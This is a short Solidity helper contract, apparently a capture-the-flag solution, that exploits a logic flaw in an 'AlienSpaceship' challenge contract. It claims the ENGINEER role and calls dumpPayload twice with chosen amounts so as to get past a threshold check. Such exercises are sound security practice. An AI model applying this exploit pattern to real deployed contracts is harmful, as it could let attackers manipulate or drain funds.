// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import'AlienSpaceship.sol';

contract Helper{
    AlienSpaceship alien;
    constructor(AlienSpaceship _alien){
        alien =_alien;
    }
    //calim a role of engineer so contract Helper can call function dumpPayload()
    function claimRole()external{
        alien.applyForJob(keccak256("ENGINEER"));
    }
    //first dumping
    //after first dumping there should stay less than 1000e18
    function help1()external{
        alien.dumpPayload(4001e18);
    }

    //second dumping
    //because of doubling
    function help2()external{
        alien.dumpPayload(999e18);
    }
}